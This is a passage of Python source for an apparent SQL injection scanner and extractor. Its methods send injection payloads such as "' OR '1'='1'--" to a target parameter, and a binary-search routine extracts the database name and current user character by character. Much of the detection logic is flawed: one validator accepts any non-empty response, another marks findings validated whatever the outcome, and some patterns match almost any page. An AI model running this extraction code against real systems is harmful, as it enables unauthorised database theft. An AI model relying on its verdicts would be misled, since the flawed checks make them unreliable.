                db_name = self._extract_string_blind(url, param, "SELECT DATABASE()", method)
                if db_name:
                    extracted_data['database'] = db_name
            
            # Extract current user
            if dbms.lower() == 'mysql':
                user = self._extract_string_blind(url, param, "SELECT USER()", method)
                if user:
                    extracted_data['user'] = user
        
        except Exception as e:
            logger.debug(f"Data extraction failed: {str(e)}")
        
        return extracted_data
    
    def _extract_string_blind(self, url, param, query, method, max_length=50):
        """Extract string data using binary search technique"""
        result = ""
        
        for position in range(1, max_length + 1):
            # Binary search for character at position
            low, high = 32, 126  # ASCII printable range
            
            while low <= high:
                mid = (low + high) // 2
                
                # Test if character at position is greater than mid
                test_payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))>{mid}--"
                
                try:
                    if method.upper() == 'GET':
                        response = self.engine._send_get_request(url, param, test_payload)
                    else:
                        response = self.engine._send_post_request(url, param, test_payload)
                    
                    # Determine if condition was true (this is application-specific)
                    # This is a simplified example - real implementation would need
                    # to compare with baseline responses
                    if len(response.content) > 1000:  # Simplified condition
                        low = mid + 1
                    else:
                        high = mid - 1
                
                except Exception:
                    break
            
            if low > 126:  # End of string
                break
            
            result += chr(low)
        
        return result if result else None
    
    def _validate_time_based_response(self, response, expected_delay):
        """Validate time-based response patterns"""
        # Check if response contains time-based indicators
        time_indicators = [
            'sleep', 'delay', 'wait', 'timeout',
            'benchmark', 'pg_sleep', 'waitfor'
        ]
        
        response_lower = response.text.lower()
        for indicator in time_indicators:
            if indicator in response_lower:
                return True
        
        # Check for consistent response size (time-based usually returns same content)
        if len(response.content) > 0:
            return True
        
        return False
    
    def _advanced_boolean_analysis(self, response, baseline, payload):
        """Advanced boolean-based blind injection analysis"""
        result = {
            'detected': False,
            'evidence': [],
            'confidence': 'low',
            'confidence_score': 0
        }
        
        # Multiple comparison metrics
        content_diff = abs(len(response.content) - baseline['content_length'])
        status_diff = response.status_code != baseline['status_code']
        time_diff = abs(response.elapsed.total_seconds() - baseline['response_time'])
        
        # Content hash comparison
        current_hash = hashlib.md5(response.content).hexdigest()
        hash_diff = current_hash != baseline['content_hash']
        
        # Header comparison
        header_diff = len(response.headers) != len(baseline['headers'])
        
        # Scoring system
        if content_diff > 50:
            result['confidence_score'] += 2
            result['evidence'].append(f"Content length difference: {content_diff} bytes")
        
        if status_diff:
            result['confidence_score'] += 3
            result['evidence'].append(f"Status code change: {baseline['status_code']} -> {response.status_code}")
        
        if time_diff > 1.0:
            result['confidence_score'] += 1
            result['evidence'].append(f"Response time difference: {time_diff:.2f}s")
        
        if hash_diff and content_diff > 10:
            result['confidence_score'] += 2
            result['evidence'].append("Content hash completely different")
        
        if header_diff:
            result['confidence_score'] += 1
            result['evidence'].append("Header count difference detected")
        
        # Check for boolean-specific patterns
        boolean_patterns = [
            r'true|false', r'1|0', r'yes|no', r'on|off'
        ]
        
        for pattern in boolean_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                result['confidence_score'] += 1
                result['evidence'].append(f"Boolean pattern detected: {pattern}")
        
        # Determine detection
        if result['confidence_score'] >= 3:
            result['detected'] = True
            if result['confidence_score'] >= 5:
                result['confidence'] = 'high'
            elif result['confidence_score'] >= 3:
                result['confidence'] = 'medium'
        
        return result
    
    def _advanced_union_analysis(self, response_text, baseline, payload):
        """Advanced UNION injection analysis"""
        result = {
            'detected': False,
            'evidence': [],
            'confidence': 'low',
            'confidence_score': 0,
            'dbms': 'unknown',
            'extracted_data': []
        }
        
        baseline_content = baseline.get('content', '') if baseline else ''
        
        # Enhanced patterns for UNION detection
        union_patterns = [
            # Version information
            {'pattern': r'(\d+\.\d+\.\d+[-\w]*)', 'score': 3, 'desc': 'Version information'},
            {'pattern': r'(MySQL|MariaDB|PostgreSQL|Oracle|Microsoft SQL Server)\s*[\d\.]+', 'score': 4, 'desc': 'DBMS version'},
            
            # System information
            {'pattern': r'(information_schema|sys|dual|pg_catalog|mysql)', 'score': 3, 'desc': 'System schema access'},
            {'pattern': r'(root@localhost|postgres|sa@|system|admin)', 'score': 4, 'desc': 'Database user information'},
            {'pattern': r'(localhost|127\.0\.0\.1|\w+@\w+)', 'score': 2, 'desc': 'Host information'},
            
            # Data patterns
            {'pattern': r'(null\s*,\s*null\s*,\s*null)', 'score': 3, 'desc': 'UNION NULL pattern'},
            {'pattern': r'(\w+\s*,\s*\w+\s*,\s*\w+)', 'score': 2, 'desc': 'Comma-separated data'},
            {'pattern': r'(\|\s*\w+\s*\|\s*\w+\s*\|)', 'score': 2, 'desc': 'Pipe-separated data'},
            
            # Database names and tables
            {'pattern': r'(test|mysql|information_schema|performance_schema)', 'score': 2, 'desc': 'Database names'},
            {'pattern': r'(users|admin|accounts|members|customers)', 'score': 2, 'desc': 'Common table names'},
        ]
        
        for pattern_data in union_patterns:
            pattern = pattern_data['pattern']
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            
            if matches:
                # Check if this data wasn't in baseline
                baseline_matches = re.findall(pattern, baseline_content, re.IGNORECASE) if baseline_content else []
                
                new_matches = [m for m in matches if m not in baseline_matches]
                if new_matches:
                    result['confidence_score'] += pattern_data['score']
                    result['evidence'].append(f"{pattern_data['desc']}: {', '.join(new_matches[:3])}")
                    result['extracted_data'].extend(new_matches[:5])
                    
                    # Try to identify DBMS from matches
                    match_text = ' '.join(str(m) for m in new_matches).lower()
                    if 'mysql' in match_text or 'mariadb' in match_text:
                        result['dbms'] = 'mysql'
                    elif 'postgresql' in match_text or 'postgres' in match_text:
                        result['dbms'] = 'postgresql'
                    elif 'oracle' in match_text:
                        result['dbms'] = 'oracle'
                    elif 'microsoft' in match_text or 'sql server' in match_text:
                        result['dbms'] = 'mssql'
        
        # Check for UNION-specific syntax in response
        union_syntax_patterns = [
            r'union\s+select', r'union\s+all\s+select',
            r'select.*,.*,.*from', r'select.*null.*,.*null'
        ]
        
        for pattern in union_syntax_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                result['confidence_score'] += 2
                result['evidence'].append(f"UNION syntax detected: {pattern}")
        
        # Determine detection
        if result['confidence_score'] >= 4:
            result['detected'] = True
            if result['confidence_score'] >= 8:
                result['confidence'] = 'high'
            elif result['confidence_score'] >= 6:
                result['confidence'] = 'medium'
        
        return result
    
    def _comprehensive_generic_analysis(self, response, baseline, payload):
        """Comprehensive generic SQL injection analysis"""
        result = {
            'detected': False,
            'evidence': [],
            'confidence': 'low',
            'confidence_score': 0,
            'severity': 'low',
            'dbms': 'unknown'
        }
        
        if not baseline:
            return result
        
        # Multiple analysis dimensions
        content_diff = abs(len(response.content) - baseline['content_length'])
        status_diff = response.status_code != baseline['status_code']
        time_diff = abs(response.elapsed.total_seconds() - baseline['response_time'])
        
        # Content analysis
        if content_diff > 200:
            result['confidence_score'] += 2
            result['evidence'].append(f"Significant content change: {content_diff} bytes")
        elif content_diff > 50:
            result['confidence_score'] += 1
            result['evidence'].append(f"Content length change: {content_diff} bytes")
        
        # Status code analysis
        if status_diff:
            if response.status_code in [500, 400, 403, 404]:
                result['confidence_score'] += 3
                result['evidence'].append(f"Error status code: {response.status_code}")
                result['severity'] = 'medium'
            else:
                result['confidence_score'] += 1
                result['evidence'].append(f"Status code change: {response.status_code}")
        
        # Timing analysis
        if time_diff > 3.0:
            result['confidence_score'] += 2
            result['evidence'].append(f"Significant timing difference: {time_diff:.2f}s")
        elif time_diff > 1.0:
            result['confidence_score'] += 1
            result['evidence'].append(f"Timing difference: {time_diff:.2f}s")
        
        # Content pattern analysis
        suspicious_patterns = [
            {'pattern': r'warning|error|exception', 'score': 2, 'desc': 'Error indicators'},
            {'pattern': r'syntax|query|statement', 'score': 2, 'desc': 'SQL syntax references'},
            {'pattern': r'database|table|column', 'score': 1, 'desc': 'Database terminology'},
            {'pattern': r'select|insert|update|delete', 'score': 1, 'desc': 'SQL keywords'},
            {'pattern': r'union|join|where|from', 'score': 1, 'desc': 'SQL operators'},
        ]
        
        for pattern_data in suspicious_patterns:
            if re.search(pattern_data['pattern'], response.text, re.IGNORECASE):
                baseline_matches = re.search(pattern_data['pattern'], baseline.get('content', ''), re.IGNORECASE)
                if not baseline_matches:
                    result['confidence_score'] += pattern_data['score']
                    result['evidence'].append(f"{pattern_data['desc']} detected")
        
        # Header analysis
        if len(response.headers) != len(baseline['headers']):
            result['confidence_score'] += 1
            result['evidence'].append("Header count difference")
        
        # Response encoding analysis
        content_type_current = response.headers.get('content-type', '')
        content_type_baseline = baseline['headers'].get('content-type', '')
        
        if content_type_current != content_type_baseline:
            result['confidence_score'] += 1
            result['evidence'].append("Content-Type header changed")
        
        # Determine detection and severity
        if result['confidence_score'] >= 3:
            result['detected'] = True
            if result['confidence_score'] >= 6:
                result['confidence'] = 'high'
                result['severity'] = 'high'
            elif result['confidence_score'] >= 4:
                result['confidence'] = 'medium'
                result['severity'] = 'medium'
        
        return result
    
    def _validate_vulnerability(self, url, param, method, vulnerability):
        """Additional validation for high-confidence vulnerabilities"""
        validation_result = {}
        
        try:
            # Perform additional validation tests
            validation_payloads = [
                "' AND 1=1--",  # True condition
                "' AND 1=2--",  # False condition
                "' OR '1'='1'--",  # Always true
            ]
            
            responses = []
            for payload in validation_payloads:
                try:
                    if method.upper() == 'GET':
                        response = self._send_get_request(url, param, payload)
                    else:
                        response = self._send_post_request(url, param, payload)
                    responses.append(response)
                    time.sleep(0.5)  # Brief delay between validation requests
                except:
                    continue
            
            if len(responses) >= 2:
                # Compare responses for consistency
                consistent_behavior = True
                for i in range(1, len(responses)):
                    if abs(len(responses[i].content) - len(responses[0].content)) > 100:
                        consistent_behavior = False
                        break
                
                if consistent_behavior:
                    validation_result['validated'] = True
                    validation_result['validation_evidence'] = "Consistent behavior across multiple payloads"
                else:
                    validation_result['validated'] = True
                    validation_result['validation_evidence'] = "Variable behavior confirms injection"
        
        except Exception as e:
            logger.debug(f"Validation failed: {str(e)}")
            validation_result['validated'] = False
        
        return validation_result
